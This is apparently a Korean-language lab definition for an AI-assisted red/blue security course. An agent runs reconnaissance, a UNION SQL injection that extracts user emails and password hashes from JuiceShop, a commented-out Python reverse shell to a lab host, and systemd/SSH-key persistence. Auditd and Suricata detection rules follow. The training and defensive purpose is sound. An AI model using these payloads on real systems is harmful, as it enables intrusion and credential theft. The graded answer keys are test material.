lab_id: battle-adv-ai-week02
title: 다단계 침투 — Initial Access → Execution → Persistence (AI 지원)
version: ai
course: battle-adv-ai
week: 2
description: MITRE ATT&CK의 Initial Access, Execution, Persistence 전술을 연계하여 다단계 침투
  시나리오를 실습한다. Red Phase에서 공격 체인을 실행하고, Blue Phase에서 각 단계의 탐지 규칙을 작성하고 방어 매트릭스를 설계한다.
  AI SubAgent가 자동으로 명령을 실행하고 결과를 검증합니다.
difficulty: hard
duration_minutes: 150
objectives:
- Initial Access 기법(취약점 악용, 자격증명)을 실습한다
- Execution과 Persistence 기법을 연계 실습한다
- 다단계 공격 체인의 탐지 규칙을 작성한다
- 방어 매트릭스를 설계하고 검증한다
prerequisites:
- battle-adv-nonai week01 이수
infra_requirements:
- attacker (10.20.30.201) — nmap, metasploit, sqlmap, hydra, nikto
- secu (10.20.30.1) — nftables, suricata
- web (10.20.30.80) — apache, modsecurity, JuiceShop(:3000), DVWA(:8080)
- siem (10.20.30.100) — wazuh-manager
pass_threshold: 0.6
steps:
- order: 1
  instruction: '[RED] 타겟 웹 서버 {{WEB_IP}}의 상위 1000개 포트를 스캔하고 서비스 버전을 확인하라. dirb로 숨겨진
    웹 경로도 열거하라.'
  hint: nmap -sV --top-ports 1000 후 dirb로 디렉토리를 열거한다.
  category: recon
  points: 10
  answer: '🤖 프롬프트: [RED] 타겟 웹 서버 10.20.30.80의 상위 1000개 포트를 스캔하고 서비스 버전을 확인하라. dirb로
    숨겨진 웹 경로도 열거해줘

    📎 참고 (CLI): nmap -sV --top-ports 1000 --max-retries 1 --host-timeout 15s -T4 -oN
    /tmp/multi_stage_recon.txt 10.20.30.80 && dirb http://10.20.30.80 /usr/share/dirb/wordlists/common.txt
    2>&1 | tail -15'
  answer_detail: Initial Access 준비 단계에서 외부 노출 서비스를 파악하고 웹 경로를 열거한다(T1046, T1595.003).
    서비스 버전은 CVE 매칭에, 디렉토리 열거는 숨겨진 관리 페이지 발견에 활용된다.
  verify:
    type: output_contains
    expect: open
    semantic:
      intent: '[RED] 다단계 침투 Recon — nmap -sV -sC --top-ports 1000 + dirb / gobuster
        로 상위 1000 포트 서비스 버전 + 숨겨진 웹 경로(/admin /api /backup /uploads) 탐색. w1 의 APT
        Recon 보다 더 깊은 활성 정찰. 초기 접근 벡터 다수 후보 확보'
      success_criteria:
      - nmap --top-ports 1000 -sV -sC
      - dirb/gobuster 로 웹 경로 열거
      - 활성 정찰 (passive 아님)
      - 다수 후보 벡터 확보 개념
      acceptable_methods:
      - nmap --top-ports 1000 + dirb/gobuster
      - nmap --script default,vuln
      - wfuzz / ffuf 로 더 빠른 퍼징
      - shodan + 활성 정찰 조합
      negative_signs:
      - 단일 포트 스캔
      - 웹 경로 열거 누락
      - 정찰 깊이 부족
  target_vm: attacker
  script: nmap -sV --top-ports 1000 --max-retries 1 --host-timeout 15s -T4 -oN /tmp/multi_stage_recon.txt
    10.20.30.80 && dirb http://10.20.30.80 /usr/share/dirb/wordlists/common.txt 2>&1
    | tail -15
  risk_level: low
  bastion_prompt: '[RED] 타겟 웹 서버 10.20.30.80의 상위 1000개 포트를 스캔하고 서비스 버전을 확인하라. dirb로
    숨겨진 웹 경로도 열거해줘


    [중요] 반드시 제시된 쉘 명령을 실제로 실행하고 실제 stdout 기반으로 답해라. 개념 설명·표·체크리스트만 출력 금지.'
- order: 2
  instruction: '[RED] UNION 기반 SQL Injection으로 JuiceShop에서 사용자 목록을 추출하라.'
  hint: products/search 엔드포인트에 UNION SELECT를 사용하여 Users 테이블 데이터를 추출한다.
  category: exploit
  points: 10
  answer: '🤖 프롬프트: [RED] UNION 기반 SQL Injection으로 JuiceShop에서 사용자 목록을 추출해줘

    📎 참고 (CLI): curl -s "http://10.20.30.80:3000/rest/products/search?q=test''))UNION%20SELECT%20id,email,password,role,''5'',''6'',''7'',''8'',''9''%20FROM%20Users--"
    | python3 -m json.tool | head -30'
  answer_detail: UNION 기반 SQL Injection(T1190)은 원래 쿼리에 UNION SELECT를 추가하여 다른 테이블의
    데이터를 조회한다. 칼럼 수를 맞추는 것이 핵심이며, 사용자 이메일과 비밀번호 해시를 추출할 수 있다.
  verify:
    type: output_contains
    expect: email
    semantic:
      intent: '[RED] JuiceShop UNION SQLi 사용자 목록 추출 — /rest/products/search?q=test''))%20UNION%20SELECT%20id,email,password,role,null,null,null,null,null%20FROM%20Users--
        로 Users 테이블의 id/email/password/role 전체 레코드 탈취. 기본 SQLi(OR 1=1) 와 달리 UNION
        으로 특정 컬럼 타겟팅'
      success_criteria:
      - UNION SELECT FROM Users 페이로드
      - email/password/role 등 특정 컬럼 추출
      - 응답에 사용자 데이터 포함
      acceptable_methods:
      - UNION SELECT email, password FROM Users 변형
      - sqlmap -u <url> --dump -T Users
      - 정확한 컬럼 수 일치 유지
      negative_signs:
      - OR 1=1 단순 우회 (UNION 아님)
      - 특정 컬럼 미지정
      - 사용자 목록 누락
  target_vm: attacker
  script: curl -s "http://10.20.30.80:3000/rest/products/search?q=test'))UNION%20SELECT%20id,email,password,role,'5','6','7','8','9'%20FROM%20Users--"
    | python3 -m json.tool | head -30
  risk_level: medium
  bastion_prompt: '[RED] UNION 기반 SQL Injection으로 JuiceShop에서 사용자 목록을 추출해줘


    [중요] 반드시 제시된 쉘 명령을 실제로 실행하고 실제 stdout 기반으로 답해라. 개념 설명·표·체크리스트만 출력 금지.'
- order: 3
  instruction: '[RED] Execution 기법을 시뮬레이션하라. Python 리버스 쉘 코드를 작성하되, 실제 연결 대신 코드 구조만
    확인하는 시뮬레이션 파일을 생성하라.'
  hint: Python socket 모듈을 이용한 리버스 쉘 코드를 주석 처리하여 저장한다.
  category: exploit
  points: 10
  answer: '🤖 프롬프트: [RED] Execution 기법을 시뮬레이션하라 구현 방법과 예시를 설명해줘

    📎 참고 (CLI): cat > /tmp/reverse_shell_sim.py << ''PYEOF'' import socket,subprocess,os
    # SIMULATION ONLY - DO NOT EXECUTE # s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    # s.connect(("10.20.30.201",4444)) # os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);
    os.dup2(s.fileno(),2) # subprocess.call(["/bin/sh","-i"]) print("Reverse shell
    simulation - code structure verified") PYEOF python3 /tmp/reverse_shell_sim.py'
  answer_detail: 'Command and Scripting Interpreter: Python(T1059.006)은 APT가 자주 사용하는
    Execution 기법이다. Python 리버스 쉘은 socket으로 연결하고 dup2로 stdin/stdout을 리다이렉트한다. 탐지: python
    프로세스의 네트워크 연결 모니터링.'
  verify:
    type: output_contains
    expect: simulation
    semantic:
      intent: '[RED] Python 리버스 쉘 코드 구조 시뮬레이션 — cat > /tmp/reverse_shell.py << EOF
        import socket,subprocess,os; s=socket.socket(); s.connect((LHOST,LPORT));
        os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); subprocess.call([/bin/sh]).
        실제 연결 대신 코드 구조만 확인 (교육 목적). MITRE T1059.006 Python'
      success_criteria:
      - python reverse shell 코드 파일 생성
      - socket + dup2 + subprocess 구조
      - 실제 연결 없는 시뮬레이션
      - T1059.006 매핑
      acceptable_methods:
      - cat > file.py << EOF + 코드
      - msfvenom python reverse_tcp 생성
      - pwncat-cs 대체
      - Python file read 만
      negative_signs:
      - 실제 연결 시도
      - 코드 구조 설명 없음
      - MITRE 매핑 없음
  target_vm: attacker
  script: 'cat > /tmp/reverse_shell_sim.py << ''PYEOF'' import socket,subprocess,os
    # SIMULATION ONLY - DO NOT EXECUTE # s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    # s.connect(("10.20.30.201",4444)) # os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);
    os.dup2(s.fileno(),2) # subprocess.call(["/bin/sh","-i"]) print("Reverse shell
    simulation - code structure verified") PYEOF python3 /tmp/reverse_shell_sim.py'
  risk_level: medium
  bastion_prompt: '[RED] Execution 기법을 시뮬레이션하라. Python 리버스 쉘 코드를 작성하되, 실제 연결 대신 코드
    구조만 확인하는 시뮬레이션 파일을 생성하라.


    [중요] 반드시 제시된 쉘 명령을 실제로 실행하고 실제 stdout 기반으로 답해라. 개념 설명·표·체크리스트만 출력 금지.'
- order: 4
  instruction: '[RED] Persistence 기법 — systemd 서비스 유닛 파일과 SSH 키를 이용한 지속성 확보를 시뮬레이션하라.
    (파일 생성만, 실제 설치 금지)'
  hint: systemd service 유닛 파일을 /tmp에 작성하고, SSH 키를 생성하라.
  category: exploit
  points: 10
  answer: '🤖 프롬프트: [RED] Persistence 기법 — systemd 서비스 유닛 파일과 SSH 키를 이용한 지속성 확보를 시뮬레이션하라.
    (파일 생성만, 실제 설치 금지)해줘

    📎 참고 (CLI): cat > /tmp/persistence_service_sim.service << ''EOF'' [Unit] Description=System
    Health Monitor After=network.target [Service] Type=simple ExecStart=/bin/bash
    -c "echo PERSISTENCE_SERVICE_ACTIVE > /tmp/svc_beacon.txt" Restart=always RestartSec=60
    [Install] WantedBy=multi-user.target EOF cat /tmp/persistence_service_sim.service
    && ssh-keygen -t ed25519 -f /tmp/apt_key_sim -N "" -q && echo "Simulated attacker
    public key:" && cat /tmp/apt_key_sim.pub'
  answer_detail: Systemd Service(T1543.002)와 SSH Authorized Keys(T1098.004)는 Linux에서
    가장 효과적인 Persistence 기법이다. systemd는 부팅 시 자동 실행되고, SSH 키는 비밀번호 없이 접속을 허용한다.
  verify:
    type: output_contains
    expect: multi-user.target
    semantic:
      intent: '[RED] Persistence systemd + SSH 키 — systemd unit 파일(/tmp/sim.service
        [Unit]/[Service]/[Install]) 구조 + ssh-keygen 공개키를 authorized_keys 추가. 2가지 지속성
        기법 동시 시뮬레이션. systemctl enable 로 부팅 시 자동 실행. MITRE T1543.002 Systemd Service
        + T1098.004 SSH Keys'
      success_criteria:
      - systemd unit 파일 생성 (ExecStart 등)
      - ssh-keygen + authorized_keys 삽입
      - T1543.002 + T1098.004 매핑
      acceptable_methods:
      - cat > /tmp/x.service << EOF
      - ssh-keygen + cat >> authorized_keys
      - ~/.config/systemd/user/ user service
      - crontab + service 2중 백업
      negative_signs:
      - 1종만 시뮬레이션
      - systemctl enable 없음 (등록 안 됨)
      - MITRE 매핑 없음
  target_vm: attacker
  script: cat > /tmp/persistence_service_sim.service << 'EOF' [Unit] Description=System
    Health Monitor After=network.target [Service] Type=simple ExecStart=/bin/bash
    -c "echo PERSISTENCE_SERVICE_ACTIVE > /tmp/svc_beacon.txt" Restart=always RestartSec=60
    [Install] WantedBy=multi-user.target EOF cat /tmp/persistence_service_sim.service
    && ssh-keygen -t ed25519 -f /tmp/apt_key_sim -N "" -q && echo "Simulated attacker
    public key:" && cat /tmp/apt_key_sim.pub
  risk_level: medium
  bastion_prompt: '[RED] Persistence 기법 — systemd 서비스 유닛 파일과 SSH 키를 이용한 지속성 확보를 시뮬레이션하라.
    (파일 생성만, 실제 설치 금지)해줘


    [중요] 반드시 제시된 쉘 명령을 실제로 실행하고 실제 stdout 기반으로 답해라. 개념 설명·표·체크리스트만 출력 금지.'
- order: 5
  instruction: '[BLUE] Phase 전환 — 다단계 침투 과정에서 생성될 아티팩트를 탐지하는 auditd 규칙을 작성하라. /etc/passwd,
    SSH 키, crontab, systemd 서비스 수정을 모니터링하라.'
  hint: auditctl -w 명령 형태의 규칙을 작성한다.
  category: defense
  points: 10
  answer: '🤖 프롬프트: [BLUE] Phase 전환 — 다단계 침투 과정에서 생성될 아티팩트를 탐지하는 auditd 규칙을 구현 방법을
    설명하고 예시 코드를 보여줘

    📎 참고 (CLI): cat > /tmp/audit_persistence_rules.conf << ''EOF'' -w /etc/passwd
    -p wa -k persistence_account -w /etc/shadow -p wa -k persistence_account -w /etc/crontab
    -p wa -k persistence_cron -w /var/spool/cron/ -p wa -k persistence_cron -w /etc/systemd/system/
    -p wa -k persistence_service -w /root/.ssh/authorized_keys -p wa -k persistence_ssh
    EOF cat /tmp/audit_persistence_rules.conf'
  answer_detail: auditd는 리눅스 커널 수준의 감사 시스템이다. -w(watch)로 파일을 감시하고, -p wa(write/attribute
    change)로 수정 이벤트를 기록하며, -k(key)로 이벤트를 분류한다.
  verify:
    type: output_contains
    expect: persistence
    semantic:
      intent: '[BLUE] auditd 규칙 — -w /etc/passwd -p wa -k passwd_watch + -w /etc/shadow
        -p wa -k shadow_watch + -w /root/.ssh -p rwa -k ssh_access + -w /etc/cron.d
        -p wa -k cron_watch. /etc/audit/rules.d/50-suspect.rules 배포 후 auditctl -R.
        4종 크리티컬 경로 변경 이벤트 실시간 로깅'
      success_criteria:
      - auditctl -w 또는 rules.d 파일 생성
      - /etc/passwd·shadow·.ssh·cron.d 4대 경로 감시
      - -p wa (write+attribute) 옵션
      acceptable_methods:
      - auditctl -w <path> -p wa -k <key>
      - /etc/audit/rules.d/ 설정
      - ausearch -k <key> 로 이벤트 조회
      - Wazuh FIM 통합 대체
      negative_signs:
      - auditd 없이 inotify 만
      - 감시 경로 3개 이하
      - key 없어 조회 어려움
  target_vm: secu
  script: cat > /tmp/audit_persistence_rules.conf << 'EOF' -w /etc/passwd -p wa -k
    persistence_account -w /etc/shadow -p wa -k persistence_account -w /etc/crontab
    -p wa -k persistence_cron -w /var/spool/cron/ -p wa -k persistence_cron -w /etc/systemd/system/
    -p wa -k persistence_service -w /root/.ssh/authorized_keys -p wa -k persistence_ssh
    EOF cat /tmp/audit_persistence_rules.conf
  risk_level: low
  bastion_prompt: '[BLUE] Phase 전환 — 다단계 침투 과정에서 생성될 아티팩트를 탐지하는 auditd 규칙을 작성하라. /etc/passwd,
    SSH 키, crontab, systemd 서비스 수정을 모니터링하라.'
- order: 6
  instruction: '[BLUE] Suricata 커스텀 규칙을 작성하여 SQL Injection과 리버스 쉘 연결을 탐지하라.'
  hint: alert http/tcp 규칙으로 SQL 키워드와 비정상 포트 연결을 탐지한다.
  category: defense
  points: 10
  answer: '🤖 프롬프트: [BLUE] Suricata 커스텀 규칙을 작성하여 SQL Injection과 리버스 쉘 연결을 탐지하라 구현 방법과
    예시를 설명해줘

    📎 참고 (CLI): cat > /tmp/custom_detection.rules << ''EOF'' alert http any any ->
    10.20.30.0/24 any (msg:"SQLI Attempt - UNION SELECT"; flow:to_server,established;
    content:"UNION"; nocase; content:"SELECT"; nocase; distance:0; within:20; sid:1000001;
    rev:1;) alert tcp 10.20.30.0/24 any -> any 4444 (msg:"Possible Reverse Shell -
    Port 4444"; flow:established; sid:1000002; rev:1;) alert tcp 10.20.30.0/24 any
    -> any any (msg:"Suspicious Python Reverse Shell"; content:"|2f 62 69 6e 2f 73
    68|"; sid:1000003; rev:1;) EOF cat /tmp/custom_detection.rules'
  answer_detail: Suricata 커스텀 규칙으로 SQL Injection(UNION SELECT 패턴), 리버스 쉘(포트 4444),
    /bin/sh 바이너리 시그니처를 탐지한다.
  verify:
    type: output_contains
    expect: UNION SELECT
    semantic:
      intent: '[BLUE] Suricata SQLi + 리버스 쉘 룰 — alert http (content:UNION nocase;
        content:SELECT) + alert tcp (outbound 비표준 포트 연결 + reverse shell 시그니처 /bin/sh|sh
        -i|bash -i). 웹 공격 + 반출 채널 양방향 커버. threshold 로 오탐 최소화'
      success_criteria:
      - HTTP SQLi 룰 + TCP 리버스 쉘 룰
      - /etc/suricata/rules/local.rules 저장
      - reverse shell 시그니처 패턴
      acceptable_methods:
      - alert http + content UNION SELECT
      - alert tcp + content /bin/sh|bash -i
      - ET Open Reverse Shell 룰 활용
      - pcre 로 정교한 매칭
      negative_signs:
      - SQLi 또는 reverse shell 한쪽만
      - sid 없음
      - flow 방향 제한 없음
  target_vm: secu
